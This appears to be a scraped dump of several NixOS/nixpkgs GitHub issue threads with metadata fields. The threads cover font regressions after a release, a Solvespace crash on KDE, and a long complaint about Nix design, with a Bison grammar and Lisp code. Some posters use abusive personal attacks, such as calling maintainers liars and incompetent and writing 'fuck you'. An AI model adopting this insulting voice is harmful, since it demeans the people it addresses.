far).  @friend It's not that I don't want to provide information. The available logging information was limited. I got a ""Warning"" that a service didn't restart correctly, but running  directly afterwards did succeed. I looked into  and  and didn't see the details that were needed for a quick resolution. I wouldn't mind running a Hydra instance for a limited number of packages, but not as long as I can't just copy paste something complete in my configuration.nix. @friend The font issue mentioned is the most user visible problem and that's 100% open-source code. If there is an intention to make things better, one could setup a canary machine that compares pixels for various terminal emulators as well as e-mail programs for different versions for rendering 'the quick brown box...'. The reason this would be a reasonable approach is that desirable font changes for a given machine for the same configuration are extremely rare, while searching for ""broken fonts"" on a search engine returns many results. It is a recurring problem resulting from a lack of QA processes. Implementing something like this could be done on various levels, but starting a terminal emulator, waiting for the window to exist with e.g. wmctr, making an automated screenshot (with scrot) and comparing the image to the reference image for equality seems to be in the realm of the possible (that could be a call to diff). Once that is in place, the same tests could be run on virtual graphics devices and shipped to end users even. End users could select that they want to opt in to the test program, where differences would result in an automatic rollback. That way they don't even need to report that their NVIDIA GTX1070 with sprinkles has a problem. Instead, they would just upgrade the next week, possibly automatically, and they would have never seen there was a problem in the first place. I agree that it would be better if Microsoft would maintain a Nix expression for Skype, but since they don't do that... If there was an open-source alternative for Skype, I wouldn't mind to share those with my contacts, but the last time I tried to use one, it didn't end well. Regarding the legal issue You should first establish that there is even a single EULA on this planet which says that you are not allowed to talk about the mere fact that a particular Nix expression accomplishes something when installed on your infrastructure. You can write a whole book about doing highly illegal things. In fact, in the case of Nix it's a mathematical theorem Given a complex state machine (a computer), and then executing a particular program will result in a particular bit being set to 1. There is no way that's illegal. A less contrived argument is that it falls under interoperability laws and you are perfectly allowed to reverse-engineer even Oracle software for such work. I am fairly sure that Oracle would be happy to see its software work on NixOS out of the box with an integrated payment system so they can more easily take your money. It's just that NixOS is so incredibly insignificant right now that merely looking at this website won't have a positive ROI for them. Doing much more than this, like running actual benchmarks and publishing those is against the EULAs of some companies, but that's a completely separate topic. So, my point stands. Legally, your arguments are not sound. If you don't want to do work for free, that's an understandable position, but don't make up legal arguments based on nothing. Just because something is community driven, doesn't mean quality has to suffer. Comparing yourself to other distributions doesn't lead to a significantly better system. The reason NixOS exists, is because all the other distributions were designed badly. The other systems cannot and will never work.  I don't think that will work reliably without repeated maintenance.  There isn't one way to render fonts, and freetype+fontconfig do change the (default) rendering a bit, from time to time.  Still, if someone was manually checking it whenever it changed and somehow was building up a database of acceptable renderings... it might work well and it would be better QA, yes.  (It's not high on my own priority list, but why not have them.) BTW, we do have some VM tests with OCR, screenshotting, etc.  The VM tests aren't very resource-efficient, and some are planned to be migrated to containers, but everyone is welcome to write more tests.  I'm certain we can accommodate reasonable ones on Hydra (for ""free"" SW at least).  This discussion is not leading to anything productive. Therefore I'm closing this issue. The other comment was edited to include the ""incompetence"" of someone responsible for the release. This language is not acceptable. You're just discrediting the hard work of our community without having contributed anything yourself. Please help instead of insulting people who want to help you. hankey I do not understand your arguments about the legal issue and will not waste any time discussing this with you. Please open a PR with alternative wording or shut up about this.  @friend You are lying again, since it has actually led to something productive in the referenced issues. As such you are essentially discrediting me, while in fact I did make a useful contribution, albeit not in code, but with a comment to the upstream author of the package causing the issue. Clearly, that has been useful. If you lack the mental capabilities to understand a legal argument, you should delegate decisions to others who do. Criticism is discrediting ""the hard work"" and can optionally include mentioning things that went well, which is exactly what I did. The fact that you haven't learned the concept of criticism as a grown man must make your life difficult. You are the one wasting the time of the community with your lies and the fact that the released software broke basic features. If you can't be bothered to run a couple of terminal emulators in all the popular environments (there are about 4 or so), why call yourself ""responsible"" for the release? If you want to receive credit for a quality release, make a quality release and you will be credited in history with this fact. The flip side is that when you don't, you get the blame and effectively negative credits. If the person responsible for this isn't incompetent, then the person responsible is not willing to make it work, which would be even worse. If you are going for the ""we don't have the resources angle"", then don't make a release at all. Closing an issue for accurately describing a release, because you disagree and you can is nothing short of what Bashar al-Assad would do. With your policy, you should just add an EULA to NixOS stating that one cannot write a review or publish a bug report about NixOS. Perhaps ask Oracle's legal team for advice on such matters. I sincerely hope that you will learn to take criticism in the future. In a corporation, this issue would be reopened, until all the dependent issues have been solved. Since no such reference has been made, I believe this is not the case. As such the only rational course of action is to reopen this issue. I will close it when the referenced issues have all been resolved. If I can upgrade to 18.03 in some months without issues I will press the thumbs up button to credit the merit of whoever is responsible for the 18.03 release if someone else makes a review of the 18.03 release. In short, please stop pissing me off, especially since I am very limited in the amount of time I can spend here. A community doesn't grow when you piss people off.  As noted, this isn't an appropriate way to engage with the NixOS community. I invite you to not participate in communities you think are full of liars and incompetent people. Maybe a different distribution has more competent members that will leave you satisfied.  I wanted to write a response how we treat people regardless how much they contribute to NixOS community, but I feel we've gone through this so many times that I just blocked @friend You're still welcome to use our free software, but you're not welcome by contributing harsh words. ",89,7,542,0,0,429,18,
NixOS/nixpkgs/32393,0.14976367499999999,NixOS,nixpkgs,solvespace: Opening a file dialog crashes Solvespace on KDE Plasma,2053,20,9,0,0,"Issue description Using any of the following file menu commands opening a file dialog window will crash Solvespace on KDE Plasma  Open... Save Save As... Export Image... Export 2d View... Export 2d Section... Export 3d Wireframe... Export Triangle Mesh... Export Surfaces... Import...  If Solvespace is started from a konsole, one gets the following error message after the program crash A similar, maybe the same, problem was already discussed in solvespace/solvespace#215, but could not be solved. In addition, other programs experience(d) similar problems in NixOS, e.g., #24943. Steps to reproduce  Install Solvespace by adding  to the list of  in  and running  Log in KDE Plasma Open a Konsole Run  Open a file dialog by, e.g., selecting File -&gt; Save...  Technical details  system  host os  multi-user?  sandbox  version  channels(root)  nixpkgs    You opened the issue originally in the right location. The author of solvespace should fix his program to report a specific error message and not crash inside one of its dependent libraries. This is not a NixOS problem. Solvespace is developed on a particular operating system and as a result it only is portable to that system. If you want to make the program work on NixOS, you need to fix the program. The observed behaviour does not warrant a change in NixOS. The solvespace people refer to ""Building on Linux"". This seems to suggest that they think it is portable across Linux systems, while it obviously is not. Portable code runs unmodified and without patches across a wide range of *nix based systems. I suggest you run it inside a Docker container or inside a Debian VM until they fix it.  For what it is worth, williammpratt's attitude here is not representative of the NixOS community's attitude toward other software. The user has since been blocked from the NixOS organization.  Looks like  is missing in the derivation.  I added this hook here 9c89e52ff20fc0f569afe8126e7f442ca575a676  This issue was rediscovered in #32651. Backported in 3bee0c2f618df4197bc146259109adbf70a999d2. ",3,0,81,0,0,85,1,
NixOS/nixpkgs/4952,0.128941266,NixOS,nixpkgs,An experience with NixOS.,41061,355,407,0,17,"I'm leaving this here in hopes that it'll be useful to someone. I didn't see anything in the NixOS manual that would indicate that I'd run into this class of problems while using it (granted, I've not read it in detail, but it's largely unreadable and overall, the whole codebase is poorly documented - attempting to discern the intent of the programmers isn't worth my time anymore, eg, where is the BNF form for the Nix language? What was so wrong with existing languages that a new one had to be invented. Where are the design documents? Perhaps I'm just not looking hard enough... in any case, looking hasn't proved useful, and reading the sources has revealed only a complete and utter disregard for quality.). Cheers.  I tried building SBCL-1.2.5, cutting out the SB-POSIX tests until I can figure out something better. I'm betting that this is NixOS related. there were issues trying to run an XULrunner binary too for whatever it's worth.  Some notes 1) For the overall design of the language and concepts, Eelco's papers are (for better or worse) the best place to look, I think. They describe the language, its motivations, and NixOS rather thoroughly. Some good starting points are Nix A Safe and Policy Free System for Software Development, and NixOS A Purely functional Linux distribution. It's been known for a while that unfortunately documentation is lacking on a few of these fronts. It's absolutely something we need to fix (I too think the NixOS on-boarding and beginner material is fairly sub-par). 2) Related to the above, there is no true BNF describing the Nix parser, unfortunately. This was a question raised recently in an attempt to write another Nix implementation in Haskell. A proper BNF is something that should be easy to add to the documentation somewhere. 3) I am confused by your inquiry about libraries being available. , , etc are all readily available in Nixpkgs (if they weren't, many other things would not be either). Your query of  does not tell you anything useful or meaningful. You must query the actual repository, which is described using Nix. For example $ nix-env -qa | egrep -i '(libx11|libxau)' libX11-1.6.2 libXau-1.0.8  In your paste of the Emacs  file, one dependency is specified as . This is not the same as  - indeed,  is actually a meta-package which encompasses the modular Xorg framework and many libraries, including , , , etc etc. You may determine this by looking at what the name  is bound to in  and seeing what other packages it incorporates. That said, I'm afraid I cannot help you with SBCL or StumpWM. I use neither. As it stands today, the NixOS community is structured such that all Nix users are, in essence, de-facto Nix developers. This community is still so small it is almost a requirement for you to use it regularly. In return, most of us believe the benefits are massive enough to deal with that. But it is not true of everyone. That is an understandably painful reality, but it's a reality we cannot yet change. Hopefully in the future we can have enough users and dedicated maintainers to alleviate this burden from the userbase, and StumpWM and SBCL and X number of other things will just work for anyone who wants them, with no effort. If a package is broken or outdated or unmaintained (which happens with any distro), it almost always falls to a user who wishes to use that software to maintain it, I'm afraid. Have you tried asking on the  channel on freenode? I've found many helpful people there in my time who may be willing to assist you in getting a more recent SBCL and StumpWM working.  Oh, and one final thing about your 'editors note' (which I'll quote to ensure everyone can read it for the future) # Fix the tests [editor's note 'fix' the tests by removing them? fuck you.]  If you wish to behave this way, I'm afraid my impression is that your mind about how to conduct yourself in public spaces is fairly made up - and no amount of honest actors will change that behavior or attitude. I can understand frustration at using new software and being perplexed by it. But your tone in here is pretty clear. And I imagine those aren't attitudes we want anyway - besides, nothing brought you here beyond your own desires. So, if that is the case, you should find a community that does appreciate that sort of attitude - perhaps the Common Lisp community does. Or the Xbox Live community, perhaps.  For worse. I would use the term ""tedious bullshit"" to describe this task, but whatever, moving on. I'm an idiot, thank you. I'll look into this now. WIP, K. curl  | grep gabriel_laddel (dolist (k '(""define remove"" ""define fix"" ""define test"") (google k))) There is nothing perplexing about Nix. A person with the handle thoughtpolice doesn't want anyone to use mean words or to be critical of a project he is involved with? Color me shocked. ... sizzle Thanks for the help.  No, actually. It's because I'm a developer who works on other open source projects (several for my job), and realistically I have better things to do than deal with annoying people telling me and other people in the projects I work on to go fuck themselves - which substantially decreases my motivation to deal with said project in the first place. Indeed, my respect lies with the NixOS developers, and not you. So you'll have to forgive me if I find you annoying, but that's life sometimes. This should be pretty plainly obvious (as opposed to your quite rude assumption of my motivations and presumably willful misinterpretation of it, as if it would help your position). But apparently it needs to be spelled out to some people who seemingly incapable of understanding these aspects of social interaction and why their behaviors might be considered harmful. Which I believe are pretty clearly alluded to in my original posting. Of course, I'm not about to succumb to such belittling tactics by people like you - that would only prove such tactics work to drive people away, ultimately harming everyone. So I'm afraid the feared Orwellian Thought Police of NixOS™ is here to stay -- much to your great despair, I imagine. Be afraid - be very afraid!  That said, this bug is a bit convoluted. Really there are several things going on here, based on your original description 1) The emacs package is missing several things, including - Infopages are not built by default. - PDF/postscript viewing doesn't work.  2) Dependencies for Emacs are unclear, although as I explained before, we should have all of these readily available. They merely follow different conventions for naming/meta-packaging. If something is missing, it can certainly be upstreamed. 3) SBCL tests should not be nerfed; furthermore they should likely be integrated into the build process on Hydra, so ever. How/if this can be fixed depends on the upstream project and the tests in question; while many projects do enable tests (by specifying  in their ), this isn't always easily doable in some cases. I'm afraid I don't know much about the specific tests in question here to comment. 4) SBCL dynamic dependencies/cffi libraries need to be properly managed in some way. There are a slew of other packages that manage their own subpackages in a similar way; Emacs is one of them, in fact. Another is OCaml or the Haskell package set. In short, we tend to write environment wrappers which properly 'set up' the environment for a specific package. For example, when we use GCC and specify a library like  in the  of an executable, this actually is translated into a set of paths in which GCC will look for libraries - this way,  directives properly work, as well as flags like . These paths are actually provided via environment variables - and GCC is actually a shell script that wraps the real GCC in with the proper flags. This explains why we have packages like  or whatnot. We would probably equally need something like an  tool, that when invoked will properly set up an environment in which the real SBCL executable will be able to  the right libraries (assuming of course there's some flag/option to control the base directory of where the  occurs and where SBCL searches for shared objects in the first place). Then, individual SBCL packages would go into their own namespace, such as , where people could select the sub libraries they want. We have quite a few toolchains that follow this exact scenario. 5) StumpWM and SBCL are outdated it seems, and could do with a working update. Really though, these are all separate issues in a way, so I would suggest you file them each in a ticket so they can be triaged and more easily tracked by developers. Having a meta-ticket is fine in general AFAIK (maybe 'overhaul SBCL support' which most of the issues would fall under), although keeping separate issues for the separate subtasks makes it easier to manage them and address individual concerns. Of course, I'm not going to do this for you, but I'd suggest that it's probably the easiest way to at least have your complaints looked at (as opposed to posting a very long Emacs buffer - the syntax highlighting actually makes it rather painful to read). Don't worry about it - although you won't be getting any from me in the future. Although I will certainly return and be sure to call you out on shitty behavior should I see it. After all, what kind of Thought Police™ would I be if I didn't? I'd be letting you down, what with the expectations you set for me!  This issue is fascinating, I've never seen a bug report written in LISP before. I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @friend . I see that you try to build EMACS from the command line. That's not how it is done in NixOS as that's not repeatable and stateful. Either you clone nixpkgs and change the nix expressions already there, or you use the packageOverrides in your  (see  asked 1 question on #nixos and then logged off when you got no replies? Perhaps the nix-dev mailing list would be more suited to your IRC style. I general I would say there is a passion for code quality and statelessness in NixOS, just go look at all the comments on issues asking to change this or that. You seem to have gotten the reverse impression from the learning curve and EMACS. Nothing I can do about that, just interesting. If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away. I don't know what causes your SBCL error. The guys in the LISP channel are correct, when you build something for Nix you fix all inputs, and if something doesn't work like that you wrap it so it only sees the part of the world that you want. Oh, those sb-posix test failures are also perplexing. Expecting 13, getting /? Wow. Of course, just turning them off was not the right thing to do. Anyway.  Oh and hats off to @friend for his detailed and gracious answers.  Oh, and I will leave one mention about the IRC channel I am not sure in what timezone the OP resides, but realistically from my time contributing I've noticed NixOS has a very large European userbase and a much smaller ""not European"" userbase. Given the assumption the logs are timestamped to a European timezone, it's perhaps not surprising most people weren't available in the early morning hours. So knowing nothing about OP, I imagine this could possibly have some impact on the availability of people to respond. As an American myself, this too has caught me off guard. So yes, the  mailing list may actually be a better place to formulate longer discussions, depending on your availability.  Also, currently NixPkgs has a working StumpWM 0.9.8 package (previous release) compiled using SBCL-1.2.5 (which is also in NixPkgs). Some of SBCL tests make assumptions about the base system;  the others are run during the SBCL build  (look for ACLREPL-TESTS)  @friend There's an SDF representation of the syntax in @friend's PHD thesis starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly.  @friend actually, you could say that  (Bison configuration) is a very strict, machine-readable BNF form... I wonder if there's a tool that takes Bison input and generates a human-readable grammar.  I've seen everyone's responses and will be responding in due time.  Relevant, apparently you can get an almost-BNF out of bison with   FWIW, here's the grammar. The tokens are defined in  $accept start $end  1 start expr  2 expr expr_function  3 expr_function ID '' expr_function 4              | '{' formals '}' '' expr_function 5              | '{' formals '}' '@' ID '' expr_function 6              | ID '@' '{' formals '}' '' expr_function 7              | ASSERT expr ';' expr_function 8              | WITH expr ';' expr_function 9              | LET binds IN expr_function 10              | expr_if  11 expr_if IF expr THEN expr ELSE expr 12        | expr_op  13 expr_op '!' expr_op 14        | '-' expr_op 15        | expr_op EQ expr_op 16        | expr_op NEQ expr_op 17        | expr_op '&lt;' expr_op 18        | expr_op LEQ expr_op 19        | expr_op '&gt;' expr_op 20        | expr_op GEQ expr_op 21        | expr_op AND expr_op 22        | expr_op OR expr_op 23        | expr_op IMPL expr_op 24        | expr_op UPDATE expr_op 25        | expr_op '?' attrpath 26        | expr_op '+' expr_op 27        | expr_op '-' expr_op 28        | expr_op '*' expr_op 29        | expr_op '/' expr_op 30        | expr_op CONCAT expr_op 31        | expr_app  32 expr_app expr_app expr_select 33         | expr_select  34 expr_select expr_simple '.' attrpath 35            | expr_simple '.' attrpath OR_KW expr_select 36            | expr_simple OR_KW 37            | expr_simple  38 expr_simple ID 39            | INT 40            | '""' string_parts '""' 41            | IND_STRING_OPEN ind_string_parts IND_STRING_CLOSE 42            | PATH 43            | SPATH 44            | URI 45            | '(' expr ')' 46            | LET '{' binds '}' 47            | REC '{' binds '}' 48            | '{' binds '}' 49            | '[' expr_list ']'  50 string_parts STR 51             | string_parts_interpolated 52             | %empty  53 string_parts_interpolated string_parts_interpolated STR 54                          | string_parts_interpolated DOLLAR_CURLY expr '}' 55                          | STR DOLLAR_CURLY expr '}' 56                          | DOLLAR_CURLY expr '}'  57 ind_string_parts ind_string_parts IND_STR 58                 | ind_string_parts DOLLAR_CURLY expr '}' 59                 | %empty  60 binds binds attrpath '=' expr ';' 61      | binds INHERIT attrs ';' 62      | binds INHERIT '(' expr ')' attrs ';' 63      | %empty  64 attrs attrs attr 65      | attrs string_attr 66      | %empty  67 attrpath attrpath '.' attr 68         | attrpath '.' string_attr 69         | attr 70         | string_attr  71 attr ID 72     | OR_KW  73 string_attr '""' string_parts '""' 74            | DOLLAR_CURLY expr '}'  75 expr_list expr_list expr_select 76          | %empty  77 formals formal ',' formals 78        | formal 79        | %empty 80        | ELLIPSIS  81 formal ID 82       | ID '?' expr   There has been no activity for a couple of weeks, so I'll close the issue. If there are actionable items hidden in this thread somewhere, I guess it would be better to create separate, new tickets for those.  There has been no activity for a couple of weeks, so I'll close the issue. If there are actionable items hidden in this thread somewhere, I guess it would be better to create separate, new tickets for those.  I'll note that I've drafted up my response to all unanswered messages but am busy and don't know when I'll have time to finish it off. Closing the issue is fine with me.  @friend just paste your draft? Otherwise you'll never come back to it...  I don't publish drafts. I'm in the middle of something at the moment and will respond over the weekend.  -) reminds me of classical Cathedral vs. Bazaar dilemma.  Wasn't able to finish over the weekend and am busy for the next two days. Best guess is wed/thurs.  Note1 I've read NixOS A Purely Functional Linux Distribution and Nix A Safe and Policy-Free System for Software Devlopment, but not the associated PHD thesis. The contents listing didn't indicate that it'd introduce me to any new ideas. Note2 I've ignored forth and apl derivatives in this comment. Anyone familiar with will understand why upon reading it. Fundamentally, package management is composed of graph traversals and transformations. The goal that separates NixOS from other package managers, reproducible builds, can be rendered as ""the ability to save and restore unix's dependency graph"". This is a neat idea, but the implementation merely trades one set of problems for another. Many crucial design decisions that should have been throughly discussed were completely ignored. For example, nowhere in the design documents is it stated that every(?) programming language already has its own package manager(s) with its own idiosyncrasies that for the most part don't share concepts or code with the others. There are many good questions that originate from this fact, were one to acknowledge it. Examples at what point is appropriate to leave package management up to a language's ecosystem? Is there ever a reason to? Can maintainers be convinced that the 'nixos way' is a good one and that packaging their code with a flag of some sort that produces a nix friendly build script is a reasonable request? Are we confident enough in nix to spend their time? Given that the NixOS plan is to modify build scripts and sources to its liking, what is the proper way to go about doing source-to-source transformations? Are there commercial offerings that solve this problem? The undiscussion of these issues is prototypical of the Nix design documents and documentation. From NixOS A Purely Functional Linux Distribution, How exactly does the reference scanner detect runtime dependencies? Regex and sed hackery? Or the correct way, parsing each language into its abstract syntax tree (ast), walking that and finding references to unix level dependencies (both static and dynamic)? I assume the former, as the latter is a great deal of work and would have been mentioned. Also, the only complete C99 parser (i.e., one that takes into account all the GCC extensions used in the linux kernel) I'm aware of is the haskell package Language.C.AST - and nix doesn't use haskell. The problem with anything other than traversing a language's ast is that you're forever stuck with an approximation of the input language, resulting in false positives etc. This is not new information. Notice that the paper says, but fails to mention how many people used NixOS over those 5 years, how many times undeclared build time dependencies /outside/ of the Nix store were encountered or how many packages were in the Nix store over this time period. Is this not relevant information? As Naggum stated above ""the rub with these 90% solutions is that you have /no/ idea when they return the wrong value becuase the approximation destroys any ability to determine correctness."" If say, most of the NixOS users are NixOS developers (which they are) and the reference scanner doesn't walk the ast of the programs in question (which it doesn't), no reported failures means exactly nothing, because there will be many code paths not encountered by its users due to the sheer complexity of the software being interfaced with (e.g., how many NixOS +developers+ users use emacs docview? Not many apparently). There are other issues with these papers I'm going to skip over, such as the clearing of environment variables (the proper thing to do imo is to gensym them to prevent unwanted interactions and study how they're being used - filter for 'functional' builds...), failure to discuss why a new project is needed in the first place (why can't you just perform this computation via an extension to an existing project?), total wtf issues with the papers (who are they written for? One who needs the concept of ""file system"" explained is going to have nfi what emacs lisp or ~/what/all/the/slashes/signify) etc. The heart of the matter is that unix (ostensibly[0]) plays host to many different philosophies of how to go about programming. Languages differ in their approach to build systems, package management, syntax and foreign function interfaces. To change the way many software packages are built in a semi-automated, non-ast-walking fashion is insane. Not to discuss this in the design documents is insane. NixOS has 46 contributors and the documentation is sufficiently general as to give each contributor his own wildly different interpretation of the scope of the project. As far as I can tell, were one to extrapolate from the given information to a set of concrete requirements we see that NixOS plans to rewrite the build scripts for every version of every project on unix. Again, this is insane. The correct thing to do in this situation is to realize the utter impossibility of the task that has been set forth and re-evaluate one's approach.[1] Let's examine the reference scanner. What is the correct way to approach the problem? We know regular expressions cannot respect the semantics of a language and thus are (unless used as a part of a larger parser) inappropriate for meta-programming (source-to-source transformations). Thus, we must work by manipulating the ast of various languages, and then pretty printing the altered code into the language's concrete syntax. Most languages don't offer the ability to do this, and one examines into e.g., Clang, he will see all sorts of nonsense about concrete/surface syntax, context free grammars and compiler technologies. This certainly can't all be necessary (hint it isn't). Consider the following mathematical expression (3 + 2)  8 / 3  3^6 Fully parenthesizing yields (((3 + 2)  8) / (3  3^6)) When computers execute programs, or humans mathematics, the order of operations must be taken into account. one way to notate the previous expression to remove such ambiguities present in mathematical notation is to move operators to the front of each parenthesized list, passing the remaining elements as its arguments. This is known as fully-parenthesized prefix notation. (/ ( (+ 3 2) 8) ( 3 (^ 3 6))) This notational scheme has a direct mapping to the program's ast, which can be rendered as  the pattern? An s-expression (fully parenthesized prefix notation) is merely a serialization for the ast. Thus,  manipulations of the sexpr correspond to manipulations of the ast. Languages with the vocabulary to manipulate the s-expression structure can manipulate themselves (their ast) just as easily as any other thusly structured information. It follows from this that all software 'tooling' and translation tasks, transparently become trees e.g., find me all things that call this function, reference this variable, modify all build scripts to take into account the new &amp;optional argument in the updated library, etc. are viewed quite transparently (and correctly) as tree traversals.[2] For whatever reason, many find s-expressions distasteful and spend much of their lives attempting to add the same meta-programming facilities to ALGOL derived languages. They all have failed. Not because of any sort of mechanical failing of the computer, but the human's inability to fully comprehend the parsing and syntactical schemes they're able to create (Ruby's parser is 10k lines of C, Clang's is &gt;100k loc. Note that the entirety of SBCL is ~300k loc, and has much fat that could be trimmed off -  is a notable failure in this regard. Watch this video  attention to 3739-4250 and you'll get to see Paul Phillips flipping out over ir/asts (same thing!). He even states his plan for the next 25 years - attempt to solve a problem solved 50+ years ago ( particular, I found these quotes quite pertinent. ""I want to programmatically generate asts and feed those"" ""Even though this is what everybody does it's kinda nuts, why is the canonical code representation a STRING?!"" (not everyone does this, just algol derivatives) ""The ast is going to be designed along side the VM"" ""I need a tight feedback loop on the thing that I'm working on right now"" Wait, like every common lisp compiler ever? 30+ years behind the times yo. ""the code that you look at, that ought to be a reflection of the AST. The canonical thing ought to be the tree, the code is a view of it.... It's trees that are fundamental, that's what we work with"" Lol. Gotcha. ""something not offered by our tremendously entangled compiler, which doesn't even have a clean parse tree. It's comical. Try to get back to the source from what you get out of the scala parser. To me, the minimum test of a parser is that it parses!"" Lol. 'Comical' is definitely the right word. ""modifiability is paramount. If it isn't straightforward to modify, it will never be any good. It will never be fast. It will never be correct. And it will eventually be replaced by something modifiable... after consuming as many hours as you feed it."" Again, 30+ yrs behind the times[3]  what does all this have to do with NixOS? Much of the complexity in NixOS originates in the failure to address why it isn't a trivial modification on an existing project. Were they to have honestly sized up the problem they'd end up at something like people suck at both reading &amp; programming, also asts are fundamental. They'd then realize that at some point you have to choose some languages and leave others, because not everyone has something to offer and writing fully compliant parsers for all the languages involved is about as entertaining as building pyramids. When one has decided on a particular scheme, one could set about implementing ""the ability to save and restore parts of unix's dependency graph"". But by failing to address this complexity NixOS inherits it, and in practice, adds to it by the 'invention' of /yet another/ language created for no particular reason. 800+ existing languages[4] and /none of them/ have the required properties? Nonsense. Allow me to anticipate your retorts ""I need to know that my nix code is functional"" +BEGIN_SRC common lisp ;; let's assume, for the sake of argument that you only want the symbols ;; design-antipattern', `the-type-gods-will-save-me' plus ;; strings to occur in your 'language' in addition to strings and keywords. You ;; know that the functions these symbols describe are functional and thus, a ;; valid program is functional. ;; ;; here is how you validate a 'nix' ast. (defun flatten (tree)   ""Traverses the tree in order, collecting non-null leaves into a list.""   (let (list)     (labels ((traverse (subtree)                (when subtree                  (if (consp subtree)                      (progn                        (traverse (car subtree))                        (traverse (cdr subtree)))                      (push subtree list)))))       (traverse tree))     (nreverse list))) (defvar myast '(functional-lol (design-antipattern ""death"")                                 (the-type-gods-wont-save-me ""destruction and chaos! also, bunnies""))) (defun validate (ast)   (every (lambda (k) (or (keywordp k) (and (symbolp k)              (member k '(functional-lol design-antipattern the-type-gods-will-save-me) test 'eq))              (stringp k)))      (flatten ast))) (validate myast) ; =&gt; nil If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away. I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @friend . There's an SDF representation of the syntax in @friend's PHD thesis starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly. -) reminds me of classical Cathedral vs. Bazaar dilemma. The process of constructing instruction tables should be very fascinating. There need be no real danger of it ever becoming a drudge, for any processes that are quite mechanical may be turned over to the machine itself. -- Turing, A. M., 1946, Proposed electronic calculator, report for National Physical Laboratory, Teddington for the present-day darkness in the programmer's world the programmers themselves are responsible and nobody else. -- Dijkstra Suppose you're trying to find the best way to structure your description of something.  (Examples  choosing the structure for a computer program to perform some task; or choosing the structure for a theory of physics.) What you hope to find is the natural structure of what you're describing — a structure that affords a really beautiful, simple description.  When you strike the natural structure, a sort of resonance occurs, in which various subsidiary problems you may have had with your description just melt away, and the description practically writes itself. But here's a problem that often occurs  You've got a structure that affords a pleasing approximate description.  But as you try to tweak the description for greater precision, instead of the description getting simpler, as it should if you were really fine-tuning near the natural structure, instead the description gets more and more complicated.  What has happened, I suggest, is that you've got a local optimum in solution space, instead of the global optimum of the natural structure  small changes in the structure won't work as well as the earlier approximation, and may not work at all, so fundamental improvement would require a large change to the structure. --  is a simple and elegant answer to this question Just learn Common Lisp well first.  New languages are exciting to people who know mostly new languages, so learn an old language before you learn new ones and get out of the maelstrom that will drown you in ever new languages that add nothing at all except some miniscule additional feature from another language that someone needed to make a whole new language to implement because he did not know (Common) Lisp to begin with.  A ""new"" language that differs from the rest of the crop by one or a couple features is proof positive that both what it came from and what it has become are mutations about to die.  There are tens if not hundreds of thousands of such ""languages"" that people have invented over the yeare, for all sorts of weird purposes where they just could not use whatever language they were already using, could not extend it, and could not fathom how to modify its tools without making a whole new language.  They never stopped to think about how horribly wasteful this is, they just went on to create yet another language called Dodo, the Titanic, Edsel, Kyoto-agreement... -- Erik Naggum,  This could be largely automated, but that is a discussion for another day.  Note1 I've read NixOS A Purely Functional Linux Distribution and Nix A Safe and Policy-Free System for Software Devlopment, but not the associated PHD thesis. The contents listing didn't indicate that it'd introduce me to any new ideas. Note2 I've ignored forth and apl derivatives in this comment. Anyone familiar with will understand why upon reading it. Note3 I posted and deleted this approximately ~5min ago - sorry, the using  common lisp ;; let's assume, for the sake of argument that you only want the symbols ;; design-antipattern', `the-type-gods-will-save-me' plus ;; strings to occur in your 'language' in addition to strings and keywords. You ;; know that the functions these symbols describe are functional and thus, a ;; valid program is functional. ;; ;; here is how you validate a 'nix' ast. (defun flatten (tree)   ""Traverses the tree in order, collecting non-null leaves into a list.""   (let (list)     (labels ((traverse (subtree)                (when subtree                  (if (consp subtree)                      (progn                        (traverse (car subtree))                        (traverse (cdr subtree)))                      (push subtree list)))))       (traverse tree))     (nreverse list))) (defvar myast '(functional-lol (design-antipattern ""death"")                                 (the-type-gods-wont-save-me ""destruction and chaos! also, bunnies""))) (defun validate (ast)   (every (lambda (k) (or (keywordp k) (and (symbolp k)              (member k '(functional-lol design-antipattern the-type-gods-will-save-me) test 'eq))              (stringp k)))      (flatten ast))) (validate myast) ; =&gt; nil ♠ ""I don't want to require a whole compiler!"" By failing to make use of existing programs NixOS not only adds a language (compiler/interpreter), but the requirement for an Emacs mode (plus one more for every other editor!), custom syntax highlighting, extra crap for auto-completion etc. etc. One should instead make use of what already exists. As it stands SLOCCOUNT reports 26.3k loc, divided across 7 languages being are used to introduce another for the nix project. This number of languages alone is enough to guarantee that no one will ever understand the whole codebase on a rolling basis and have enough time to do much else with their life. A preceptable analogy to the natural languages springs forth if we created them for the same reason so-called professional programmers create programming languages, each new subculture would require a whole new alphabet/glyph scheme, phonetic system, grammatical structures etc. Though some surface features may be shared across languages, the underlying semantics they represent would change in unpredictable and often incompatible ways.[5] ""So, you want us to write lisp? What if something better comes along?"" You are faced with a choice - either learn from those who came before you, or spend the rest of your life fighting monstrosities of your own creation, attempting to eke out some order in all the chaos, be it the SDF/BNF format of a language's syntax or otherwise. In any case, if something better comes along, transforming your s-expression code into &lt;powerful new notation&gt; will be a straightforwards intern-level task[6]. Now to address some unanswered questions. You don't say. You're in Mexico city and ask a bystander to direct you to the airport (your phone died, you lack a map and you're going to miss your plane unless you make it to the airport soon). He gives very specific instructions, which you write down and follow exactly. You reach the last instruction somewhere near the slums, missing your flight. As such, you swear loudly. Is anyone entitled to correct directions? Of course not. I however, expect the /bare minimum/ of people giving correct directions and accurate descriptions of their projects, much like I expect my friends to brush their teeth regularly. If I say ""jump in front of the bus on my mark, ready? 1, 2, 3 - JUMP!"" it is clear what I'm asking/ordering, what is less clear is why I'd be asking/ordering someone to jump in front of a bus. There are very few classics in the field of computing. We are at the very beginning of this journey and it hasn't even begun to get interesting yet. IMHO, the Cathedral vs. Bazaar isn't in anyway a dilemma or a classic. Linux was a failure 20 years ago, it is a failure today and any posturing otherwise is just that. See The UNIX-HATERS Handbook[0] for more information. I find the contrast between these quotes accurately depicts the computing situation circa 2015.  Footnotes  [0] In actuality unix is mostly a pile of stupid, see web.mit.edu/~simsong/www/ugh.pdf [1] [2] This scheme the surrounding ideas are so fundamental that they've sometime's referred to as ""Maxwell's equations of Software"". You can read more about Lisp and s-expressions elsewhere so I'll not repeat it here.  This information re, Scala is interesting beyond the 